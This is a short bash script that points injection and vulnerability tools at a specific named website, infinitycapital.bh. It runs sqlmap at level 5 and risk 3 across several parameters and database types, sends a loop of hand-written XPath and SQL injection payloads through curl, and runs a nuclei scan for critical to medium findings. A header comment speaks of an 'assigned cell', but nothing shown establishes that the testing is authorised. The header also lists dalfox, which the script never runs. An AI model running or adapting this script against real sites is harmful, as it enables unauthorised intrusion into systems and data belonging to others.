#!/bin/bash
# 1) sqlmap on the assigned cell + real params,  2) nuclei,  3) dalfox
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T='https://www.infinitycapital.bh'
echo "######## SQLMAP: /?zzz=1 (assigned xpath/sqli cell) ########"
sqlmap -u "$T/?zzz=1" --batch --level=5 --risk=3 --threads=4 --timeout=15 \
  --technique=BEUSTQ --dbms=MySQL,PostgreSQL,MSSQL,Oracle,SQLite \
  -p 'zzz,page,id,search' --random-agent --output-dir=/tmp/sq1 2>&1 | tail -30
echo "######## SQLMAP: /?id=1&search=test&page=2 ########"
sqlmap -u "$T/?id=1&search=test&page=2" --batch --level=5 --risk=3 --threads=4 --timeout=15 \
  --technique=BEUSTQ --dbms=MySQL,PostgreSQL,MSSQL,Oracle,SQLite \
  -p 'id,search,page' --random-agent --output-dir=/tmp/sq2 2>&1 | tail -30
echo "######## XPATH-INJECTION manual (separate class) ########"
for p in "1" "count(//*)" "'or '1'='1" "1 and 1=1" "concat('a','b')" "//user" "boolean(1)" "1](" ; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$p")
  printf '  %-22s ' "$p"
  curl -sk -A "$UA" -m 20 "$T/?zzz=$enc" -o /tmp/x.html -w "%{http_code}:%{size_download}" ; echo " md5=$(md5sum /tmp/x.html|cut -c1-16)"
done
echo "######## NUCLEI ########"
nuclei -u "https://www.infinitycapital.bh/" -A "$UA" -silent -no-update-templates \
  -severity critical,high,medium -stats 2>&1 | tail -40
echo DONE
